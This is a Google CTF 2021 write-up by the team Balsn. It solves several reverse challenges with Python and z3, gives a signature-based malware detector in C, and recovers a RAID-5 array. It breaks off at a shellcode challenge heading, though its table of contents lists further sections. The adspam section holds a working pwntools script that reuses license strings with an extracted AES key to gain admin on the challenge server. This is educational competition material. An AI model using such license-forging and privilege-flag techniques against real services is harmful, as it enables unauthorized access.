---
title: "googlectf2021 writeups"
category: "crypto"
subcategory: "rsa"
type: "writeup"
tags: ["crypto", "rsa", "aes", "ecb", "gcm", "xor", "shellcode", "z3", "privesc"]
summary: "It's recommended to read our responsive web version of this writeup."
source:
  name: "balsn/ctf_writeup"
  url: "https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20210717-googlectf2021/README.md"
ctf:
  name: "googlectf2021"
  year: 2021
---

## Source

- **CTF:** googlectf2021 2021
- **Repository:** [balsn/ctf_writeup](https://github.com/balsn/ctf_writeup)
- **File:** <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20210717-googlectf2021/README.md>

---
# Google CTF 2021 Quals

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20210717-googlectf2021/) of this writeup.**


 - [Google CTF 2021 Quals](#google-ctf-2021-quals)
   - [Reverse](#reverse)
     - [cpp](#cpp)
     - [Polymorph](#polymorph)
     - [hexagon](#hexagon)
     - [adspam](#adspam)
   - [Misc](#misc)
     - [RAIDERS OF CORRUPTION](#raiders-of-corruption)
     - [ABC ARM AND AMD](#abc-arm-and-amd)
       - [Goal](#goal)
       - [Instruction orr vs <code>jge</code>](#instruction-orr-vs-jge)
       - [Deal with familiar architecture first! (x86-64)](#deal-with-familiar-architecture-first-x86-64)
       - [Learning arm64v8 shellcode](#learning-arm64v8-shellcode)
         - [System call](#system-call)
         - [Loading an arbitrary integer into a register](#loading-an-arbitrary-integer-into-a-register)
       - [Optimization](#optimization)
         - [Optimization: openat(-100, "flag", 0, 0)](#optimization-openat-100-flag-0-0)
         - [Optimization: use strh](#optimization-use-strh)
         - [Optimization: reuse adds](#optimization-reuse-adds)
       - [The final payload](#the-final-payload)
       - [Postscript](#postscript)
       - [References](#references)
   - [Pwn](#pwn)
     - [EBPF](#ebpf)
     - [Fullchain](#fullchain)
       - [Renderer RCE ( V8 )](#renderer-rce--v8-)
       - [Sandbox Escaping](#sandbox-escaping)
       - [Local Privilege Escalation ( kernel )](#local-privilege-escalation--kernel-)
     - [memsafety](#memsafety)
   - [Web](#web)
     - [letschat](#letschat)
       - [Failed attempts](#failed-attempts)
     - [gpushop](#gpushop)
     - [secdriven](#secdriven)
     - [empty ls](#empty-ls)
   - [Crypto](#crypto)
     - [pythia](#pythia)
       - [Description](#description)
       - [AES-GCM](#aes-gcm)
       - [Tag collision](#tag-collision)
       - [Ciphertext forging](#ciphertext-forging)
       - [Capture the flag](#capture-the-flag)


## Reverse

### cpp

The file cpp.c is a c source code file with lots of macro, the goal is to define the macro `FLAG_0` ~ `FLAG_20` with correct characters to pass the flag check. The logic of flag checker and the execution flow are implemented by the macro, the abstract of each blocks of macro is as following:


```c=
#if __INCLUDE_LEVEL__ == 0
//define FLAG
#define S 0
//define ROM bits
//copy FLAG to ROM
//define l, MA, _MA, LD, _LD for memory operation
#endif

#if __INCLUDE_LEVEL__ > 12
//main logic of flag checker
#else
    #if S != -1
    #include "cpp.c"
    #endif
    #if S != -1
    #include "cpp.c"
    #endif
#endif

#if __INCLUDE_LEVEL__ == 0
    #if S != -1
        #error "Failed to execute program"
    #endif
    #include <stdio.h>
    int main() {
    printf("Key valid. Enjoy your program!\n");
    printf("2+2 = %d\n", 2+2);
    }
#endif

```

The macro `__INCLUDE_LEVEL__` represents the depth of nesting `#include` and starts out at 0. The `cpp.c` recursivly include itself until the depth is greater than 12, then it start to execute the main logic of flag checker.

The `S` is used to indicate the program state of flag checker. If the flag is correct, we'll see the output, `Key valid. Enjoy your program!`.

The control flow of the flag checker is as following:

![](https://i.imgur.com/hmZ2zlF.jpg)

The $S_{i}$ represent the code block of `#if S == i`. There are only few types of operation in the flag checker:

- Jump to the next state and the number S of the destination state is not the current S + 1, such as $S_0$

```c
#if S == 0
#undef S
#define S 1
#undef S
#define S 24
#endif

```

- Set a variable to it's ones' complement, such as $S_1$


```c
// R = !R (R0 is the lowest bit of R)
#if S == 1
#undef S
#define S 2
#ifdef R0
#undef R0
#else
#define R0
#endif
#ifdef R1
#undef R1
#else
...

```

- Assign value to a variable, such as $S_2$


```c 
// Z = 1
#if S == 2
#undef S
#define S 3
#define Z0
#undef Z1
#undef Z2
#undef Z3
#undef Z4
#undef Z5
#undef Z6
#undef Z7
#endif

```

- Add operation, such as $S_3$


```c 
// R += Z
if S == 3
#undef S
#define S 4
#undef c
#ifndef R0
#ifndef Z0
#ifdef c
#define R0
#undef c
#endif
#else
#ifndef c
#define R0
#undef c
#endif
#endif
#else
...

```

- Branch, such as $S_7$
- Copy a value from variable to another, such as $S_{15}$
- And operation, such as $S_{16}$
- Read value from ROM, such as $S_{45}$


```c 
// C = ROM[B]
#if S == 45
#undef S
#define S 46
#undef l0
#ifdef B0
#define l0 1
#else
#define l0 0
#endif
#undef l1
#ifdef B1
#define l1 1
...

```

- Xor operation, such as $S_{46}$
- Or operation, such as $S_{52}$

The pseudo code of flag checker:


```python=
ROM = {0: 187,1: 85,2: 171,3: 197,4: 185,5: 157,6: 201,7: 105,8: 187,9: 55,10: 217,11: 205,12: 33,13: 179,14: 207,15: 207,16: 159,17: 9,18: 181,19: 61,20: 235,21: 127,22: 87,23: 161,24: 235,25: 135,26: 103,27: 35,28: 23,29: 37,30: 209,31: 27,32: 8,33: 100,34: 100,35: 53,36: 145,37: 100,38: 231,39: 160,40: 6,41: 170,42: 221,43: 117,44: 23,45: 157,46: 109,47: 92,48: 94,49: 25,50: 253,51: 233,52: 12,53: 249,54: 180,55: 131,56: 134,57: 34,58: 66,59: 30,60: 87,61: 161,62: 40,63: 98,64: 250,65: 123,66: 27,67: 186,68: 30,69: 180,70: 179,71: 88,72: 198,73: 243,74: 140,75: 144,76: 59,77: 186,78: 25,79: 110,80: 206,81: 223,82: 241,83: 37,84: 141,85: 64,86: 128,87: 112,88: 224,89: 77,90: 28}

flag = 'CTF{write_flag_here_please}'
for i in range(27):
    ROM[128+i] = flag[i]
# all int are int8
# 24~28
I = 0
M = 0
N = 1
P = 0
Q = 0


# 29~31
while I + 0b11100101 != 0:
    #32
    B = 128
    # 33
    B += I 
    # 34
    l = B
    A = ROM[l]
    #35
    l = I 
    B = ROM[l]
    #36
    R = 1
    #12 13
    X = 1
    Y = 0
    #14
    while X != 0:
        #15
        Z = X
        #16
        Z &= B
        #17
        if Z != 0:
            #18
            Y += A
        #19
        X *= 2
        #20
        A *= 2
    #22
    A = Y
    #1
    R = !R
    #2
    Z = 1
    #3 #4
    R += 2*Z
    #5
    if R == 0: 
        # 38
        O = M
        # 39
        O += N
        # 40
        M = N
        # 41
        N = O
        #42
        A += M
        #43
        B = 0b00100000
        #44
        B += I
        #45
        l = B
        C = ROM[l]
        #46
        A ^= C
        #47
        P += A
        #48
        B = 0b01000000
        #49
        B += I
        #50
        l = B
        A = ROM[l]
        #51
        A ^= P
        #52
        Q |= A
        #53
        A = 1
        #54
        I += A
    else:
        #6
        R += Z
        #7
        if R == 0:
            # 59
            print("Failed to execute program")
            break
        else:
            #8
            R += Z
            #9
            if R == 0:
                # 59
                print("Failed to execute program")
                break
            else:
                #10
                print("BUG")
                break

else:
    #56
    if Q != 0:
        #57
        print("INVALID_FLAG")
    else:
        #58
        print("CORRECT")


```

Which can be simplified as:


```python=
ROM = {0: 187,1: 85,2: 171,3: 197,4: 185,5: 157,6: 201,7: 105,8: 187,9: 55,10: 217,11: 205,12: 33,13: 179,14: 207,15: 207,16: 159,17: 9,18: 181,19: 61,20: 235,21: 127,22: 87,23: 161,24: 235,25: 135,26: 103,27: 35,28: 23,29: 37,30: 209,31: 27,32: 8,33: 100,34: 100,35: 53,36: 145,37: 100,38: 231,39: 160,40: 6,41: 170,42: 221,43: 117,44: 23,45: 157,46: 109,47: 92,48: 94,49: 25,50: 253,51: 233,52: 12,53: 249,54: 180,55: 131,56: 134,57: 34,58: 66,59: 30,60: 87,61: 161,62: 40,63: 98,64: 250,65: 123,66: 27,67: 186,68: 30,69: 180,70: 179,71: 88,72: 198,73: 243,74: 140,75: 144,76: 59,77: 186,78: 25,79: 110,80: 206,81: 223,82: 241,83: 37,84: 141,85: 64,86: 128,87: 112,88: 224,89: 77,90: 28}

# all int are int8

from ctypes import *
from string import printable
idx = 4

flag = list(b'CTF{write_flag_here_please}')

I = 0
M = 0
N = 1
P = 0
Q = 0
for i in range(27):
    ROM[128+i] = flag[i]

while I != 27:
    A = c_uint8(ROM[128+I]*ROM[I]).value
    (M, N) = (N, M + N)
    A = c_uint8(A+M).value
    C = ROM[32+I]
    A ^= C
    P = c_uint8(P+A).value
    A = ROM[64+I]
    A ^= P
    Q |= A
    I += 1

if Q != 0:
    print("INVALID_FLAG")
else:
    print("CORRECT")

```

It's possible to reverse the operations to get the flag, but brute forcing is more easy and quickly.


```python
ROM = {0: 187,1: 85,2: 171,3: 197,4: 185,5: 157,6: 201,7: 105,8: 187,9: 55,10: 217,11: 205,12: 33,13: 179,14: 207,15: 207,16: 159,17: 9,18: 181,19: 61,20: 235,21: 127,22: 87,23: 161,24: 235,25: 135,26: 103,27: 35,28: 23,29: 37,30: 209,31: 27,32: 8,33: 100,34: 100,35: 53,36: 145,37: 100,38: 231,39: 160,40: 6,41: 170,42: 221,43: 117,44: 23,45: 157,46: 109,47: 92,48: 94,49: 25,50: 253,51: 233,52: 12,53: 249,54: 180,55: 131,56: 134,57: 34,58: 66,59: 30,60: 87,61: 161,62: 40,63: 98,64: 250,65: 123,66: 27,67: 186,68: 30,69: 180,70: 179,71: 88,72: 198,73: 243,74: 140,75: 144,76: 59,77: 186,78: 25,79: 110,80: 206,81: 223,82: 241,83: 37,84: 141,85: 64,86: 128,87: 112,88: 224,89: 77,90: 28}

from ctypes import *
from string import printable
idx = 4

dic = (n for n in printable[:-5].encode())
flag = list(b'CTF{write_flag_here_please}')
flag_len = len(flag)

while idx < flag_len:
    I = 0
    M = 0
    N = 1
    P = 0
    Q = 0
    flag[idx] = next(dic)
    for i in range(27):
        ROM[128+i] = flag[i]

    while I <= idx:
        A = c_uint8(ROM[128+I]*ROM[I]).value
        (M, N) = (N, M + N)
        A = c_uint8(A+M).value
        C = ROM[32+I]
        A ^= C
        P = c_uint8(P+A).value
        A = ROM[64+I]
        A ^= P
        Q |= A
        if Q != 0:
            break
        I += 1
    else:
        print(bytes(flag))
        dic = (n for n in printable[:-5].encode())
        idx += 1

#56
print(bytes(flag))
if Q != 0:
    #57
    print("INVALID_FLAG")
else:
    #58
    print("CORRECT")


```
### Polymorph

We use the following strategy to detect the malware:

- match the executable file with signature `"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`
- Has RWX segment
- Has string `crypt_badstuff`

Because there is a normal program `ASPARAGUS` has RWX segment, we use the special string,`You look around. Everything is black. Except for some text,`, in it as a special case.




```c=
#define _GNU_SOURCE /* See feature_test_macros(7) */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include<stdbool.h>
#include<unistd.h>
#include<string.h>
#include<fcntl.h>
#include<syscall.h>
#include<elf.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<sys/ptrace.h>
#include<sys/user.h>
#include<sys/wait.h>
#include<sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>

void printerror(char *msg){
  puts(msg);
  exit(1);    //assume all files that let antivirus crash is malicious
}

int openFile(char *fname){
  int fd = open(fname,0,0);
  if(fd<0) printerror("open failed");
  return fd;
}

char* getFileContent(int fd,int *fsize){
  int size = lseek(fd,0,SEEK_END);
  lseek(fd,0,SEEK_SET);
  *fsize = size;
  size = (size+0xfff)&0xfffff000;
  if(size<0) printerror("file size calculation failed");
  char *fbuf = mmap(0,size,7,0x2,fd,0);
  if(fbuf==NULL) printerror("mmap file failed");
  return fbuf;
}

void mal_fingerprint(const char *content, long bufsize)
{
    if (memmem(content, bufsize, "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*", 68))
        printerror("malware pattern found");
    if (memmem(content, bufsize, "EICAR-STANDARD-ANTIVIRUS-TEST-FILE", 34))
        printerror("tiny malware pattern found");
}

void checkNonElfPhdrAndRWX(char *fbuf, int fsize){
  Elf64_Ehdr *ehdr = (Elf64_Ehdr*)fbuf;
  if(memcmp(ehdr->e_ident,"\x7f\x45\x4c\x46",4))
    exit(0);    //assume all malware should be elf
  if(ehdr->e_ident[4]!=2)
    printerror("32 bits");    //32 bit elf binaries are benign, are you kidding me?
  if(ehdr->e_phoff!=sizeof(Elf64_Ehdr))
    printerror("misaligned phdr");    //I doubt this malware adopts this trick, but just to be safe
  if(ehdr->e_phnum==0)
    printerror("no phdrs");    //Again, this should be impossible
  Elf64_Phdr *phdr = (Elf64_Phdr*)(((unsigned long long int)fbuf)+ehdr->e_phoff);
  for(int i=0;i<ehdr->e_phnum;i++){
     if(((unsigned long long int)phdr)+sizeof(Elf64_Phdr)>((unsigned long long int)fbuf)+fsize)
       printerror("phdr oob");    //Bad binary
     if(i==0 && phdr->p_type!=PT_PHDR)
       printerror("PT_PHDR missing");    //no PT_PHDR
    if((phdr->p_flags&(PF_X|PF_W))==(PF_X|PF_W))
       printerror("wx page exist"); //wx page
     phdr++;
  }
  return;
}

void bypass_ASPARAGUS(char *fbuf, int fsize){
    if (memmem(fbuf, fsize, "You look around. Everything is black. Except for some text,", 59))
        exit(0);
}

void  detect_crypt(char *fbuf, int fsize){
    if (memmem(fbuf, fsize, "crypt_badstuff", strlen("crypt_badstuff")))
        printerror("crypt_badstuff found");
}

void detect(char *filename)
{
    int fd = openFile(filename);
    int fsize;
    char *fbuf = getFileContent(fd,&fsize);
    bypass_ASPARAGUS(fbuf, fsize);
    detect_crypt(fbuf, fsize);
    checkNonElfPhdrAndRWX(fbuf,fsize);
    mal_fingerprint(fbuf, fsize);
    return;
}

int main(int argc, char **argv)
{
    detect(argv[1]);
    exit(0);
}


```

### hexagon

* In this challenge, we are given a binary in [Qualcomm's Hexagon](https://developer.qualcomm.com/software/hexagon-dsp-sdk) architecture
* I found this [plugin](https://github.com/gsmk/hexagon) whuch can help disassembling the binary file
* In check_flag(), there are six hex() functions.
* They are not difficult to understand. Then, you can use z3 to get the flag.


```=python
#!/usr/bin/python2

from pwn import *
from z3 import *

f = open('challenge').read()

target = f[0x515:0x515+0x50]


a = 0x28

newTarget = ""

for i in target:
  #print ord(i)
  #print chr((ord(i)^a)%256)
  newTarget += chr((ord(i)^a)%256)
  a+=1
#print newTarget.encode('hex')
#print newTarget


s = Solver()

x = BitVec('a',32)
y= BitVec('b',32)

a = x
b = y

# hex1

t1 = 1

if (t1 & (2**6) != 0):
  a += 0x7A024204
  a = -1 - a
else:
  a += 0xA5D2F34
  a = -1 - a 
a = 0x6F67202A ^ a


# hex2

t1 = 6
if (t1 & (2**3) != 0):
  b ^= 0xE6F4590B
  b += 0x5487CE1E
else:
  b = 0xffffffff - b
  b ^= 0x48268673
b = 0x656C676F ^ b



# hex3

t1 = 0xF
r0 = 0x6E696220
if (t1 & (2**8) != 0):
  r0 = 0xffffffff - r0
  r0 += 0x85776E9A
else:
  r0 ^= 0x5A921187
  r0 += 0xE9BB17BC
r0 = r0 ^ b
an = b
bn = r0 ^ a
a = an
b = bn


# hex4


t1 = 0x1C
r0 = 0x682D616A
if (t1 & (2**0) != 0):
  r0 = 0xffffffff - r0
  r0 = 0xffffffff - r0
else:
  r0 = 0xffffffff - r0
  r0 ^= 0xD71037D1
r0 = r0 ^ b
an = b
bn = r0 ^ a
a = an
b = bn


# hex5

t1 = 0x2D
r0 = 0x67617865
if (t1 & (2**0) != 0):
  r0 = 0xffffffff - r0
  r0 += 0x101FBCCC
else:
  r0 = 0xffffffff - r0
  r0 += 0x55485822
r0 = r0 ^ b
an = b
bn = r0 ^ a
a = an
b = bn

# hex6

t1 = 0x42
r0 = 0x2A206E6F
if (t1 & (2**3) != 0):
  r0 ^= 0x49A3E80E
  r0 ^= 0x6288E1A5
else:
  r0 ^= 0x8B0163C1
  r0 ^= 0xEECE328B
r0 = r0 ^ b
an = b
bn = r0 ^ a
a = an
b = bn

s.add(a == u32(newTarget[:4]))
s.add(b == u32(newTarget[4:8]))




print s.check()
print s.model()
#print hex(s.model()[BitVec('a',32)].as_long())
print p64(s.model()[x].as_long())
print p64(s.model()[y].as_long())

# the flag is CTF{IDigVLIW}

```

### adspam

* It's a apk reverse challenge.
* The commucation between client and server is encrypted. We need to reverse libnative-lib.so first.
* encrypt(), decrypt() and declicstr() are our targets.
* encrypt() and decrypt() use AES-ECB encryption. The key is `eaW~IFhnvlIoneLl`
* declicstr() is a RSA-decryption function. We can also find the key in libnative-lib.so
* encrypt() and decrypt() are used in the communication. declicstr() is used to decrypt license strings.
* After reversing the apk, I found that we need to send a json-like message like this to the server

```
{
    "license":$license,
    "name":"Balsn",
    "is_admin":0,
    "device_info":{"os_version":"123","api_level":1,"device":"blabla"}
}

```
* It's obvious that changing `is_admin` to 1 should solve this challenge.
* `license` is a rsa-encrypted string which contains `name` and `is_admin`. Unfortunately, we cannot forge a license since we only got the decryption key.
* There are some example license strings lying in `app-release/res/raw/lic`. We cannot forge a license string. But we can reuse them!
* The following are the license strings we have

```
QIknTsIjeUEF9yJjeZ/kPPfTlSm8vzMU4LWjzfSXvN+OSqBu3iNgZJgeW7fc8oltH9MprO9nI8vxgsjO/VA4t7YuNm16a7elPVAHqD4dXtzngnZPpsbek3Rc/We/WQ5YxXHgUt7YJ6tcd4wH3fhduC9tl/E5elwJL/YAcbD4mT8=
\x0b133
o9kjqYWCBKMgodl1JvDiscUeRjh9Ip9HcC7tHskoYqNQfAPE0XvSAKBSOFgleNHzVY9BVkfxmutgn/kVXUs3yl/qAurc4jokg0eA/v3flnnkWxqTOh4vv0yfr7PGXqwHk4qUFK1SldZ4VsLhd8PAb0aHj22E5b4U5jeJ16z187E=
7_ha
gpDbCb0BmUZfdKVIZgF08lQ80K9SeUsRadZG+UUjE7wI1NRZ1evLk2GQ3sqskGHFKlPg8cTR2Xy69WedNu4QLboOWm/w13ocOvHwCoiQ1ZdmibgnhMQBznqpjpBnL083YMRYskcUX68R2PFaXY3taV7MoG1DyQWFRfdr/CnLyS8=
cker
ZBLhwMu0DbgpUANm2ukYldrppJERiH1Tgp02CRB5I4dDP8n4+ZCv33ScspELtgAKHhiwIVksQVsnwDLsQRi6nqq9nrIwqSHMR0TwOe6UKTpAegbH53FXtriopPHfLuI2M45SzJ88GFjXy7wfOOjwDYe4KKO9KU8+LGD15Au73EM=
$798
Hygv+bTtsnI9IBf44GkvoF38r3g5zBB7uyYT7PTlbjhCdgYRwRayutI3vY+n66xM7GOFgUFVIBI5+OBDnvazLNttjGomPED/OXlImndWvrZxYcaKaE3vYGPezorV0xwPahGGq/DWafPKdYxLxwICq1GXKYNAckCZIqfpGbJRRwg=
b7dd
GARMZAX7fQN7i7Wnp4J6HxMTLe9+VM/wGJs+zN6b9IOmynh2gIkGjmssfOA9KdYydqBLEOJymayH8HeyrtInhhQNR3el8A5n8GMEMkyF1gUFAiSEPyhNeWWOj2IAHGNNwccmF7QywdfOUGjsTNFbrW6Yl5QLLAmMbA95qF0IERk=
4-d1
YWlx8Cok1x/3ZsW9JKIsKj9UpBaCNkXSPiVXUrNX1IDZE0B8iNr3iliOr90TW0BvsIaFEwvDTlcESXJ8kLc3iZq0fm1lgujfM7Z156VdxEPjr9LplcEZ9ZVhYGNtVyGIRcouUDJHu3FVfXQ1XesaNlNHOb50hADprsw3RnTAGbU=
71-1
I3dsx2vSfXxZ1/QlMbwYPRFEZBtOuB8qLEY8cqFVtYjMluNWSkbHAYB+kwCBEv3yuoOjkdQEfqq4pS+K0ka1+pFDyss8sSbV3OiZdpRf40SS/pZxw2duJr9uDd1DdX8mST7fdjqj0V1a2ZBMpqaEI2gFlCwzXlfZBC47LKNiM+8=
1eb-
ow7r5VJMGfSf0odNKxzBpUtSJdj8gHdt+Z7Xu54MAdsnUParSjrtRI4yJYzcW4toOFmDdSs5SERR289yohYI5hHSWLElv/44O+g4M08F5qpwCmOp5otW32qRG1RnhqR95evH44nOyK24UnpvWlebNwVhniSu4A7znjluGRrao/U=
5149
TeGqGWv8ZmsY/rFq1puW9N+01TWTKJm8qzUuY/7JUCPDJ1AR6Y3XsPb73FuSVHPL63sjiuCTiKTRSUDzBE0VBfo59rtOKI05k64Jrz88nODD7BiK7ssacsOr2dAFGQKgBaWV2jitSAdxtCmh9sDpYsfs0/vXBBfVLqfVZDfAVGQ=
-1fa
Al3QWY+nNFoLezt+rSdbWmqp7iZ+rR9pnM35IJNZ63bLQeM3CUvULVczhrM3toXNLCY7xmAT4jg+u0uDAjanaKMB+T1Tmym7aaCqwCfHYVFn5nw+tw54e13CLxj7OO+e847+XH8DtK/BiA+n03vPnt/cEDPvIM59sPsjHThJvpk=
5960
VOGr60qxiO1r0YlKnrIWbQu7UhBmtBeNw2NDQnoNU3H1mjVEs/ji3AYuEGc2HGKINByq7Mpb4mWKD2oH5ii/UZDpxbzCFlJrjvjEG25c9Hhf2fiQHvRXmJd8iA8YdffBii3csCjaydLFSX6Vn7XPg+/PF/TdM1zUiLTJZX4LXRw=
3ced
ELL9maLDpdmmEgaT76qtw9IugtaQX2r7V7QVqMKXQcbwq7o0dvaO3+yMt6m5K5Milm4JSNwX/810YUaoAsHNuaIavuLRsxbP3b6KnKxaKz3EDgyhye2en3U1EZouiLljBB0bKz8rAtyGdolWDdNoKjvLhv7x2edc05HQZOt3aiA= 5\x010\x00

'\x0b1337_hacker$798b7dd4-d171-11eb-5149-1fa59603ced5\x010\x00'


```
* We can build a license string like this `\x0b1337_hacker$798b7dd4-d171-11eb-5149-1fa59603ced514951495149514951495149514951495149514951495149` which will make is_admin non-zero. And we got the flag!

aes.py

```=python
#!/usr/bin/python2

from Crypto.Cipher import AES
import base64

BLOCK_SIZE_16 =  AES.block_size
def decrypt(enStr, key):
   cipher = AES.new(key, AES.MODE_ECB)
   decryptByts = base64.b64decode(enStr)
   msg = cipher.decrypt(decryptByts)
   return msg

def encrypt(enStr, key):
   cipher = AES.new(key, AES.MODE_ECB)
   x = BLOCK_SIZE_16 - (len(enStr) % BLOCK_SIZE_16)
   if x != 0:
      enStr = enStr + chr(x)*x
   msg = cipher.encrypt(enStr)
   msg = base64.b64encode(msg)
   return msg


```
ans.py

```=python
#!/usr/bin/python2

import aes
import base64
from pwn import *

r = remote("adspam.2021.ctfcompetition.com", 1337)

key = 'eaW~IFhnvlIoneLl'
r.recvuntil('== proof-of-work: disabled ==\n')

license = "QIknTsIjeUEF9yJjeZ/kPPfTlSm8vzMU4LWjzfSXvN+OSqBu3iNgZJgeW7fc8oltH9MprO9nI8vxgsjO/VA4t7YuNm16a7elPVAHqD4dXtzngnZPpsbek3Rc/We/WQ5YxXHgUt7YJ6tcd4wH3fhduC9tl/E5elwJL/YAcbD4mT8=::o9kjqYWCBKMgodl1JvDiscUeRjh9Ip9HcC7tHskoYqNQfAPE0XvSAKBSOFgleNHzVY9BVkfxmutgn/kVXUs3yl/qAurc4jokg0eA/v3flnnkWxqTOh4vv0yfr7PGXqwHk4qUFK1SldZ4VsLhd8PAb0aHj22E5b4U5jeJ16z187E=::gpDbCb0BmUZfdKVIZgF08lQ80K9SeUsRadZG+UUjE7wI1NRZ1evLk2GQ3sqskGHFKlPg8cTR2Xy69WedNu4QLboOWm/w13ocOvHwCoiQ1ZdmibgnhMQBznqpjpBnL083YMRYskcUX68R2PFaXY3taV7MoG1DyQWFRfdr/CnLyS8=::ZBLhwMu0DbgpUANm2ukYldrppJERiH1Tgp02CRB5I4dDP8n4+ZCv33ScspELtgAKHhiwIVksQVsnwDLsQRi6nqq9nrIwqSHMR0TwOe6UKTpAegbH53FXtriopPHfLuI2M45SzJ88GFjXy7wfOOjwDYe4KKO9KU8+LGD15Au73EM=::Hygv+bTtsnI9IBf44GkvoF38r3g5zBB7uyYT7PTlbjhCdgYRwRayutI3vY+n66xM7GOFgUFVIBI5+OBDnvazLNttjGomPED/OXlImndWvrZxYcaKaE3vYGPezorV0xwPahGGq/DWafPKdYxLxwICq1GXKYNAckCZIqfpGbJRRwg=::GARMZAX7fQN7i7Wnp4J6HxMTLe9+VM/wGJs+zN6b9IOmynh2gIkGjmssfOA9KdYydqBLEOJymayH8HeyrtInhhQNR3el8A5n8GMEMkyF1gUFAiSEPyhNeWWOj2IAHGNNwccmF7QywdfOUGjsTNFbrW6Yl5QLLAmMbA95qF0IERk=::YWlx8Cok1x/3ZsW9JKIsKj9UpBaCNkXSPiVXUrNX1IDZE0B8iNr3iliOr90TW0BvsIaFEwvDTlcESXJ8kLc3iZq0fm1lgujfM7Z156VdxEPjr9LplcEZ9ZVhYGNtVyGIRcouUDJHu3FVfXQ1XesaNlNHOb50hADprsw3RnTAGbU=::I3dsx2vSfXxZ1/QlMbwYPRFEZBtOuB8qLEY8cqFVtYjMluNWSkbHAYB+kwCBEv3yuoOjkdQEfqq4pS+K0ka1+pFDyss8sSbV3OiZdpRf40SS/pZxw2duJr9uDd1DdX8mST7fdjqj0V1a2ZBMpqaEI2gFlCwzXlfZBC47LKNiM+8=::ow7r5VJMGfSf0odNKxzBpUtSJdj8gHdt+Z7Xu54MAdsnUParSjrtRI4yJYzcW4toOFmDdSs5SERR289yohYI5hHSWLElv/44O+g4M08F5qpwCmOp5otW32qRG1RnhqR95evH44nOyK24UnpvWlebNwVhniSu4A7znjluGRrao/U=::TeGqGWv8ZmsY/rFq1puW9N+01TWTKJm8qzUuY/7JUCPDJ1AR6Y3XsPb73FuSVHPL63sjiuCTiKTRSUDzBE0VBfo59rtOKI05k64Jrz88nODD7BiK7ssacsOr2dAFGQKgBaWV2jitSAdxtCmh9sDpYsfs0/vXBBfVLqfVZDfAVGQ=::Al3QWY+nNFoLezt+rSdbWmqp7iZ+rR9pnM35IJNZ63bLQeM3CUvULVczhrM3toXNLCY7xmAT4jg+u0uDAjanaKMB+T1Tmym7aaCqwCfHYVFn5nw+tw54e13CLxj7OO+e847+XH8DtK/BiA+n03vPnt/cEDPvIM59sPsjHThJvpk=::VOGr60qxiO1r0YlKnrIWbQu7UhBmtBeNw2NDQnoNU3H1mjVEs/ji3AYuEGc2HGKINByq7Mpb4mWKD2oH5ii/UZDpxbzCFlJrjvjEG25c9Hhf2fiQHvRXmJd8iA8YdffBii3csCjaydLFSX6Vn7XPg+/PF/TdM1zUiLTJZX4LXRw=::ow7r5VJMGfSf0odNKxzBpUtSJdj8gHdt+Z7Xu54MAdsnUParSjrtRI4yJYzcW4toOFmDdSs5SERR289yohYI5hHSWLElv/44O+g4M08F5qpwCmOp5otW32qRG1RnhqR95evH44nOyK24UnpvWlebNwVhniSu4A7znjluGRrao/U=::"

# k = 5149

k = "ow7r5VJMGfSf0odNKxzBpUtSJdj8gHdt+Z7Xu54MAdsnUParSjrtRI4yJYzcW4toOFmDdSs5SERR289yohYI5hHSWLElv/44O+g4M08F5qpwCmOp5otW32qRG1RnhqR95evH44nOyK24UnpvWlebNwVhniSu4A7znjluGRrao/U=::"

license += k*12

payload='''
  {"license":"%s","name":"1337_hacker"}
''' %  (license)

r.sendline(aes.encrypt(payload,key))

a = r.recvline()
print a
print aes.decrypt(a,key)
r.interactive()

# the flag is CTF{n0w_u_kn0w_h0w_n0t_t0_l1c3n53_ur_b0t}

```

## Misc

### RAIDERS OF CORRUPTION

* It's a raid challenge. we are given ten raid-5 images

```
$ file disk01.img 
disk01.img: Linux Software RAID version 1.2 (1) UUID=ad89154a:f0c39ce3:99c46240:21b5e681 name=0 level=5 disks=10

```
* But the device roles are cleared

```
$ mdadm --misc --examine ./disk01.img 
./disk01.img:
          Magic : a92b4efc
        Version : 1.2
    Feature Map : 0x0
     Array UUID : ad89154a:f0c39ce3:99c46240:21b5e681
           Name : 0
  Creation Time : Wed Apr 28 13:39:00 2021
     Raid Level : raid5
   Raid Devices : 10

 Avail Dev Size : 8192
     Array Size : 36864 (36.00 MiB 37.75 MB)
    Data Offset : 2048 sectors
   Super Offset : 8 sectors
   Unused Space : before=1968 sectors, after=0 sectors
          State : active
    Device UUID : c0e88e3c:62aaf6ff:d701e002:d4be4142

    Update Time : Wed Apr 28 15:11:16 2021
  Bad Block Log : 512 entries available at offset 16 sectors
       Checksum : dbf6b2c8 - correct
         Events : 18

         Layout : left-symmetric
     Chunk Size : 4K

   Device Role : spare
   Array State : AAAAAAAAAA ('A' == active, '.' == missing, 'R' == replacing)


```
* We need to figure out the order of these ten images
* Fortunately, We can find some plaintext in these images.
* Those images contain some [scripts](https://www.infoplease.com/primary-sources/books-plays/william-shakespeare/william-shakespeare-romeo-and-juliet-act-i-scene-ii) which can help us find the order.
* Then I manually concatenate those images. Use `foremost` to get the `flag.jpg`

```=python
#!/usr/bin/python2

from pwn import *

raid = []


o = ["03",
 "05",
 "02",
 "08",
 "09",
 "10",
 "01",
 "07",
 "04",
 "06"
]

for i in range(10):
  a = "disk%s.img" % o[i]
  f = open(a).read()
  raid.append(f[0x100000:])

s = ""

for i in range(0x400000/0x1000):
  p = 9 - ((i+4)%10)
  #print o[p], hex(0x100000+i*0x1000)
  for j in range(10):
    if j==p:
      continue
    s+=raid[j][i*0x1000: (i+1)*0x1000]
    
open('flag',"w").write(s)

```



![](https://i.imgur.com/ukL0lqR.jpg)


### ABC ARM AND AMD

#### Goal

The goal of this challenge is to provide a printable shellcode (which can only contain byte from `0x20` to `0x7f`) that can print out the content of file `flag` in both `x86-64` and `arm64v8` and the length of shellcode must not exceed 280 bytes.

#### Instruction `orr` vs `jge`

